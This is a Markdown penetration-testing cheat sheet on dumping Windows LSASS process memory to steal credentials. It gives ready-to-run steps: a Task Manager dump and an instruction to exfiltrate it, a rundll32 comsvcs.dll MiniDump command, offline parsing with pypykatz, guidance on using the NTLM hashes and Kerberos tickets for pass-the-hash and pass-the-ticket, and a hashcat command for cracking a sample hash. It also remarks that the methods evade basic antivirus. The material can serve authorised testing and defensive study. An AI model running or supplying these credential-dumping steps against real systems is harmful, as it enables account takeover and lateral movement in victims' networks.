# Attacking LSASS (Credential Dumping)
**Concept:** The `lsass.exe` process manages authentication. By dumping its memory to a file, we can extract secrets (hashes, tickets, keys) offline. 
> [!Warning]
> Accessing `lsass.exe` is a **High Alert** action. Modern EDRs and Antivirus (Defender) heavily monitor handle requests to this process.
## 1. Extraction: Method 1 (GUI - Task Manager)
**Context:** You have RDP or VNC access as a Local Administrator. This is often "stealthier" against basic AV than running Mimikatz.exe directly.
1. Open **Task Manager** (`Ctrl+Shift+Esc`). 
2. Go to the **Details** tab.
3. Right-click `lsass.exe`.
4. Select **Create dump file**.

- **Location:** The file is saved to `C:\Users\<User>\AppData\Local\Temp\lsass.DMP`.
- **Action:** Move this file to a non-system folder immediately and exfiltrate it.
## 2. Extraction: Method 2 (CLI - Rundll32)
**Context:** You have a shell (Cmd/PowerShell) as Administrator/SYSTEM. This uses a "Living Off The Land" binary (`comsvcs.dll`) to dump memory, often bypassing simple whitelist restrictions.
### Step 1: Find the PID
We need the Process ID (PID) of `lsass.exe`.
```powershell
# Command Prompt
tasklist /svc | findstr lsass

# PowerShell
Get-Process lsass | Select-Object Id
```
### Step 2: Create the Dump
**Syntax:** `rundll32 <DLL>, MiniDump <PID> <Output_File> full`
```powershell
# Example (Assuming PID is 672)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\Windows\Temp\lsass.dmp full
```
## 3. Offline Extraction (Pypykatz)
**Context:** Pypykatz is a Python implementation of Mimikatz. Running it **offline** on your Kali machine is safer than uploading the Mimikatz binary to the target.
1. **Exfiltrate:** Transfer `lsass.dmp` from the victim to your attacker machine.
2. **Parse:** Use Pypykatz to extract secrets.
```shell
# Install
pip3 install pypykatz

# Parse the dump file
pypykatz lsa minidump /home/kali/loot/lsass.dmp
```
## 4. Analyzing the Output
Pypykatz will output several sections. Here is what matters:

| **Section**  | **Content**      | **Utility**                                                                            |
| ------------ | ---------------- | -------------------------------------------------------------------------------------- |
| *MSV*      | *NTLM Hashes*  | The most common target. Crack these or use them for **Pass-the-Hash**.                 |
| *WDIGEST*  | *Cleartext*    | Often `(null)` on Windows 10/Server 2016+ (unless a specific registry key is enabled). |
| *Kerberos* | *Tickets/Keys* | Contains TGTs and TGSs. Used for **Pass-the-Ticket** or Overpass-the-Hash.             |
| *DPAPI*    | *Master Keys*  | Used to decrypt Chrome passwords, Outlook credentials, and RDP saved connections.      |
### Example Output Analysis
```powershell
== MSV ==
    Username: bob
    Domain: DESKTOP-33E7O54
    NT: 64f12cddaa88057e06a81b54e73b949b  <-- TARGET (NTLM Hash)
    SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8

== WDIGEST ==
    username bob
    password (null)                       <-- WDigest is disabled (Standard)
```
## 5. Cracking the Hash
**Context:** You extracted the NTLM hash (`NT`) from the MSV section.
```shell
# Hashcat Mode 1000 (NTLM)
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```